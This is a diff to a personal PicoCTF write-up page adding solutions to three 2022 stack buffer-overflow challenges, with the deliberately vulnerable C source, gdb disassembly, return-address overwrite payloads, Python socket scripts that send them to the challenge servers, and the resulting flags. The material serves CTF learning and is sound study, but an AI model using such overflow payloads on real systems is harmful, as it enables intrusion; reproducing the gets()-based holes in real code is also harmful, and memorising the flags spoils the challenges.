@@ -1,4 +1,4 @@
-# [PicoCTF](./picoctf.md) Binary Exploitation [5/33]
+# [PicoCTF](./picoctf.md) Binary Exploitation [8/33]
 
 Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker.
 
@@ -26,10 +26,10 @@ Binary exploitation is the process of subverting a compiled application such tha
 - [homework (2021)](#homework)
 - [lockdown-horses (2021)](#lockdown-horses)
 - [vr-school (2021)](#vr-school)
-- [buffer overflow 1 (2022)](#buffer-overflow-1)
+- [buffer overflow 1 (2022)](#buffer-overflow-1) 🗸
 - [RPS (2022)](#rps) 🗸
-- [x-sixty-what (2022)](#x-sixty-what)
-- [buffer overflow 2 (2022)](#buffer-overflow-2)
+- [x-sixty-what (2022)](#x-sixty-what) 🗸
+- [buffer overflow 2 (2022)](#buffer-overflow-2) 🗸
 - [buffer overflow 3 (2022)](#buffer-overflow-3)
 - [flag leak (2022)](#flag-leak)
 - [ropfu (2022)](#ropfu)
@@ -2370,6 +2370,225 @@ picoCTF{CVE-2021-34527}
 ### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
 
 ---
+
+## buffer overflow 1
+
+- Author: Sanjay C / Palash Oswal
+- 200 Points
+
+### Description
+
+Control the return address.
+Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln).
+You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using:
+
+~~~shell
+$ nc saturn.picoctf.net 62538
+~~~
+
+### Hints
+
+1. Make sure you consider big Endian vs small Endian.
+2. Changing the address of the return pointer can call different functions.
+
+### Attachments
+
+1. [vuln](https://artifacts.picoctf.net/c/250/vuln)
+2. [vuln.c](https://artifacts.picoctf.net/c/250/vuln.c)
+	
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Running the program, we can see a user input is taken and the program jumps to a memory address:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+test
+Okay, time to return... Fingers Crossed... Jumping to 0x804932f
+~~~
+
+We can see the short user input does not affect the address:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+1234
+Okay, time to return... Fingers Crossed... Jumping to 0x804932f
+~~~
+
+Reviewing the source code we can see return address should point to the main function.  The user input allocation is a fixed buffer size of 32 so we can overflow this and possibly chanfe the return address:
+
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "asm.h"
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+~~~
+
+Let us try a 32-character input:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Okay, time to return... Fingers Crossed... Jumping to 0x804932f
+~~~
+
+This provides the correct response, adding more characters:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+Okay, time to return... Fingers Crossed... Jumping to 0x65656565
+Segmentation fault (core dumped)
+~~~
+
+We have overwritten the return address with 0x65656565 which corresponds to the "e" characters in the input.  We can identify the endian-ness by entering a variable string in place of the "e" characters:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123
+Okay, time to return... Fingers Crossed... Jumping to 0x33323130
+Segmentation fault (core dumped)
+~~~
+
+We can see this is in little-endian format, we can change the address to reflect the "win" function that will return the flag.  We can use gdb to find the address of the win function:
+
+~~~shell
+$ gdb vuln
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from vuln...
+(No debugging symbols found in vuln)
+(gdb) info addr win
+Symbol "win" is at 0x80491f6 in a file compiled without debugging.
+~~~
+
+We can use python to pipe the new address to the executable:
+
+~~~shell
+$ python -c "print('a'*44+'\xf6\x91\x04\x08')" | ./vuln
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+Please create 'flag.txt' in this directory with your own debugging flag.
+~~~
+
+We can use the socket library to connect to the remote server using Python and retrieve the flag:
+
+~~~py
+import socket
+import binascii
+import time
+
+URL = "saturn.picoctf.net"
+PORT = 51208
+
+sock = socket.socket()
+sock.connect((URL,PORT))
+
+data = sock.recv(1024).decode()
+print(data)
+
+a = binascii.unhexlify(hex(0xf6)[2:])
+b = binascii.unhexlify(hex(0x91)[2:])
+c = binascii.unhexlify("0"+hex(0x04)[2:])
+d = binascii.unhexlify("0"+hex(0x08)[2:])
+
+InputString = ("a"*44).encode()+a+b+c+d+"\n".encode()
+print(InputString)
+sock.send(InputString)
+time.sleep(1)
+data = sock.recv(1024).decode()
+print(data)
+
+sock.close()
+~~~
+
+This provides the output:
+
+~~~
+Please enter your string: 
+
+b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08\n'
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
+~~~
+
+</details>
+
+---
+
+### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
 	
 ## RPS
 
@@ -2661,7 +2880,437 @@ picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
 ### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
 
 ---
+
+## x sixty what
+
+- Author: Sanjay C / LT 'syreal' Jones
+- 200 Points
+
+### Description
+
+Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this [program](https://artifacts.picoctf.net/c/192/vuln). [Download source](https://artifacts.picoctf.net/c/192/vuln.c).
+
+~~~
+nc saturn.picoctf.net 55327
+~~~
+
+### Hints
+
+1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
+2. Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
+
+### Attachments
+
+1. [vuln](https://artifacts.picoctf.net/c/192/vuln)
+2. [vuln.c](https://artifacts.picoctf.net/c/192/vuln.c)
 	
-This page was last updated Dec 21.
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can run the program and overflow the buffer to get a segmentation fault:
+
+~~~shell
+$ ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+~~~
+
+Reviewing the source code, we can see the user input is a buffer of length 64 Bytes:
+
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+void flag() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFFSIZE];
+  gets(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
+  vuln();
+  return 0;
+}
+~~~
+
+We can overflow this buffer with 65 characters:
+
+~~~shell
+$ python -c "print('a'*65)" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag: 
+Segmentation fault (core dumped)
+~~~
+
+Using gdb, we can see the user input at 0x04012ca:
+
+~~~shell
+$ gdb vuln
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from vuln...
+(No debugging symbols found in vuln)
+(gdb) disass vuln
+Dump of assembler code for function vuln:
+   0x00000000004012b2 <+0>:	endbr64 
+   0x00000000004012b6 <+4>:	push   %rbp
+   0x00000000004012b7 <+5>:	mov    %rsp,%rbp
+   0x00000000004012ba <+8>:	sub    $0x40,%rsp
+   0x00000000004012be <+12>:	lea    -0x40(%rbp),%rax
+   0x00000000004012c2 <+16>:	mov    %rax,%rdi
+   0x00000000004012c5 <+19>:	mov    $0x0,%eax
+   0x00000000004012ca <+24>:	callq  0x401100 <gets@plt>
+   0x00000000004012cf <+29>:	nop
+   0x00000000004012d0 <+30>:	leaveq 
+   0x00000000004012d1 <+31>:	retq   
+End of assembler dump.
+~~~
+
+We can overwrite the RBP register with a string of 64 + 8 + Payload(8) Bytes. 
+
+As per the hint, we need to jump to the second function in the flag routine, we can disassemble flag:
+
+~~~shell
+(gdb) disass flag
+Dump of assembler code for function flag:
+   0x0000000000401236 <+0>:	endbr64 
+   0x000000000040123a <+4>:	push   %rbp
+   0x000000000040123b <+5>:	mov    %rsp,%rbp
+   0x000000000040123e <+8>:	sub    $0x50,%rsp
+   0x0000000000401242 <+12>:	lea    0xdbf(%rip),%rsi        # 0x402008
+   0x0000000000401249 <+19>:	lea    0xdba(%rip),%rdi        # 0x40200a
+   0x0000000000401250 <+26>:	callq  0x401130 <fopen@plt>
+   0x0000000000401255 <+31>:	mov    %rax,-0x8(%rbp)
+   0x0000000000401259 <+35>:	cmpq   $0x0,-0x8(%rbp)
+   0x000000000040125e <+40>:	jne    0x401289 <flag+83>
+   0x0000000000401260 <+42>:	lea    0xdac(%rip),%rdx        # 0x402013
+   0x0000000000401267 <+49>:	lea    0xdba(%rip),%rsi        # 0x402028
+   0x000000000040126e <+56>:	lea    0xde8(%rip),%rdi        # 0x40205d
+   0x0000000000401275 <+63>:	mov    $0x0,%eax
+   0x000000000040127a <+68>:	callq  0x4010e0 <printf@plt>
+   0x000000000040127f <+73>:	mov    $0x0,%edi
+   0x0000000000401284 <+78>:	callq  0x401140 <exit@plt>
+   0x0000000000401289 <+83>:	mov    -0x8(%rbp),%rdx
+   0x000000000040128d <+87>:	lea    -0x50(%rbp),%rax
+   0x0000000000401291 <+91>:	mov    $0x40,%esi
+   0x0000000000401296 <+96>:	mov    %rax,%rdi
+   0x0000000000401299 <+99>:	callq  0x4010f0 <fgets@plt>
+   0x000000000040129e <+104>:	lea    -0x50(%rbp),%rax
+   0x00000000004012a2 <+108>:	mov    %rax,%rdi
+   0x00000000004012a5 <+111>:	mov    $0x0,%eax
+   0x00000000004012aa <+116>:	callq  0x4010e0 <printf@plt>
+--Type <RET> for more, q to quit, c to continue without paging--c
+   0x00000000004012af <+121>:	nop
+   0x00000000004012b0 <+122>:	leaveq 
+   0x00000000004012b1 <+123>:	retq   
+~~~
+
+This is the "mov" function at address 0x40123b.  The payload can be tested using Python:
+
+~~~shell
+$ python -c "print('a'*72+'\x3b\x12\x40\x00\x00\x00\x00\x00')" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag: 
+Please create 'flag.txt' in this directory with your own debugging flag.
+~~~
+
+In python, we can pass this payload to the server:
+
+~~~py
+import socket
+import binascii
+import time
+
+URL = "saturn.picoctf.net"
+PORT = 55327
+
+sock = socket.socket()
+sock.connect((URL,PORT))
+
+data = sock.recv(1024).decode()
+print(data)
+
+a = binascii.unhexlify(hex(0x3b)[2:])
+b = binascii.unhexlify(hex(0x12)[2:])
+c = binascii.unhexlify(hex(0x40)[2:])
+d = binascii.unhexlify("0"+hex(0x00)[2:])
+
+InputString = ("a"*72).encode()+a+b+c+d*5+"\n".encode()
+print(InputString)
+sock.send(InputString)
+time.sleep(1)
+data = sock.recv(1024).decode()
+print(data)
+
+sock.close()
+~~~
+
+This returns the flag:
+
+~~~
+Welcome to 64-bit. Give me a string that gets you the flag: 
+
+b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x12@\x00\x00\x00\x00\x00\n'
+picoCTF{b1663r_15_b3773r_11c407bc}
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{b1663r_15_b3773r_11c407bc}
+~~~
+
+</details>
+
+---
+
+### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## buffer overlflow 2
+
+- Author: Sanjay C / Palash Oswal
+- 300 Points
+
+### Description
+
+Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)? 
+You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). And connect with it using:
+
+~~~
+nc saturn.picoctf.net 65313
+~~~
+
+### Hints
+
+1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
+2. Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
+
+### Attachments
+
+1. [vuln](https://artifacts.picoctf.net/c/344/vuln)
+2. [vuln.c](https://artifacts.picoctf.net/c/344/vuln.c)
+	
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can test the program to verify the user input buffer can be overwritten:
+
+~~~shell
+$ ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+~~~
+
+Reviewing the source code, we can see the buffer is set to 100 Bytes. We can also see the function "win" that we need to point to:
+
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 100
+#define FLAGSIZE 64
+
+void win(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+~~~
+
+We can see the segmentation fault occurs with 108 characters:
+
+~~~shell
+$ python -c "print('a'*108)" | ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+~~~
+
+Using gdb we can find the address of the win function:
+
+~~~shell
+(gdb) info addr win
+Symbol "win" is at 0x8049296 in a file compiled without debugging.
+~~~
+
+With a buffer of 112 Bytes, we can call the win function:
+
+~~~shell
+$ python -c "print('a'*112+'\x96\x92\x04\x08')" | ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
+Please create 'flag.txt' in this directory with your own debugging flag.
+~~~
+
+Creating the flag.txt file with string "test", we re-run and get a segmentation fault:
+
+~~~shell
+$ python -c "print('a'*112+'\x96\x92\x04\x08')" | ./vuln
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
+Segmentation fault (core dumped)
+~~~
+
+The function requires additional inputs as detailed in the source code, with additional 4 Bytes padding, we can pass both arguments "0xCAFEF00D" and "0xF00DF00D" to retrieve the test string:
+
+~~~shell
+$ python -c "print('a'*112+'\x96\x92\x04\x08'+'bbbb'+'\x0d\xf0\xfe\xca'+'\x0d\xf0\x0d\xf0')" | ./vuln
+Please enter your string: 
+���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�bbbb
+test
+Segmentation fault (core dumped)
+~~~
+
+In python, we can pass this payload to the executable hosted on the challenge server:
+
+~~~py
+import socket
+import binascii
+import time
+
+URL = "saturn.picoctf.net"
+PORT = 65313
+
+sock = socket.socket()
+sock.connect((URL,PORT))
+
+data = sock.recv(1024).decode()
+print(data)
+
+a = binascii.unhexlify(hex(0x96)[2:])
+b = binascii.unhexlify(hex(0x92)[2:])
+c = binascii.unhexlify("0"+hex(0x04)[2:])
+d = binascii.unhexlify("0"+hex(0x08)[2:])
+e = binascii.unhexlify("0"+hex(0x0d)[2:])
+f = binascii.unhexlify(hex(0xf0)[2:])
+g = binascii.unhexlify(hex(0xfe)[2:])
+h = binascii.unhexlify(hex(0xca)[2:])
+i = binascii.unhexlify("0"+hex(0x0d)[2:])
+j = binascii.unhexlify(hex(0xf0)[2:])
+k = binascii.unhexlify("0"+hex(0x0d)[2:])
+l = binascii.unhexlify(hex(0xf0)[2:])
+
+InputString = ("a"*112).encode()+a+b+c+d+("b"*4).encode()+e+f+g+h+i+j+k+l+"\n".encode()
+print(InputString)
+sock.send(InputString)
+time.sleep(1)
+data = sock.recv(1024)
+print(data)
+
+sock.close()
+~~~
+
+This provides the response:
+
+~~~
+Please enter your string: 
+b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0\n'
+b'\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0\npicoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
+~~~
+
+</details>
+
+---
+
+### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+	
+This page was last updated April 22.
 	
 ## [djm89uk.github.io](https://djm89uk.github.io)
